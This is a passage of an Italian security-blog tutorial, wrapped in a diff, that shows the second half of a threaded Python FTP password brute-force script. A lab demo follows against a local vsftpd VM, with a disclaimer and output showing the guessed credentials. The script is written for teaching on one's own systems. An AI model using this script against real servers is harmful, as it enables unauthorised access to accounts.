+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Password: </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}{</span>Fore<span style="color:#f92672">.</span>RESET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+            <span style="color:#75715e"># we found the password, let&#39;s clear the queue</span>
+            <span style="color:#66d9ef">with</span> q<span style="color:#f92672">.</span>mutex:
+                q<span style="color:#f92672">.</span>queue<span style="color:#f92672">.</span>clear()
+                q<span style="color:#f92672">.</span>all_tasks_done<span style="color:#f92672">.</span>notify_all()
+                q<span style="color:#f92672">.</span>unfinished_tasks <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        <span style="color:#66d9ef">finally</span>:
+            <span style="color:#75715e"># notify the queue that the task is completed for this password</span>
+            q<span style="color:#f92672">.</span>task_done()
+
+<span style="color:#75715e"># read the wordlist of passwords</span>
+passwords <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;wordlist.txt&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+
+print(<span style="color:#e6db74">&#34;[+] Passwords to try:&#34;</span>, len(passwords))
+
+<span style="color:#75715e"># put all passwords to the queue</span>
+<span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> passwords:
+    q<span style="color:#f92672">.</span>put(password)
+
+<span style="color:#75715e"># create `n_threads` that runs that function</span>
+<span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> range(n_threads):
+    thread <span style="color:#f92672">=</span> Thread(target<span style="color:#f92672">=</span>connect_ftp)
+    <span style="color:#75715e"># will end when the main thread end</span>
+    thread<span style="color:#f92672">.</span>daemon <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+    thread<span style="color:#f92672">.</span>start()
+<span style="color:#75715e"># wait for the queue to be empty</span>
+q<span style="color:#f92672">.</span>join()
+</code></pre></div><h1 id="prova-sul-campo">Prova sul Campo<a href="#prova-sul-campo" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Ora che abbiamo tutto, mettiamo alla prova le nostre conoscenze.</p>
+<blockquote>
+<p><em>Disclaimer: ⚠️ Quello che verrà visto di seguito è un esempio per il solo scopo educativo, violare sistemi informatici senza autorizzazione è un reato, vi invito dunque a replicare quanto vedrete SOLO su sistemi di vostra proprietà. ⚠️</em></p>
+</blockquote>
+<p>Andiamo a installare vsftpd e inseriamo un nuovo utente. L&rsquo;utente appena creato avrà come credenziali:</p>
+<blockquote>
+<p>test : test</p>
+</blockquote>
+<p>Una volta creato <code>l'utente</code> <em>test</em> con la <code>password</code> <em>test</em> possiamo inserire le relative informazioni nello script, useremo il secondo essendo che sfrutta i thread, una volta inserito nello script lo username dell&rsquo;utente che ci interessa e l&rsquo;indirizzo IP della macchina avviamo il codice python con:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 brute-ftp.py
+</code></pre></div><p>Nel mio caso sto eseguendo lo script su un portatile con Pop os e la macchina &ldquo;vittima&rdquo; è una mcchina Ubuntu virtualizzata su VirtualBox. Una volta che lo script ha finito e riesce a trovare la password per l&rsquo;utente test, questo è l&rsquo;output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Passwords to try: <span style="color:#ae81ff">7</span>
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying <span style="color:#ae81ff">123</span>
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying aheq
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying weeqe
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying 9wee
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying wewe
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying <span style="color:#ae81ff">9002</span>
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying test
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found credentials: 
+        Host: 192.168.1.242
+        User: test
+        Password: test
+</code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://kobra3390.github.io/SpaceHack/posts/basi-sul-modulo-scrapy/basi_sul_modulo_scrapy/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Basi sul Modulo Scrapy</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/">
+                <span class="button__text">Introduzione All&#39;ARP Poisoning</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
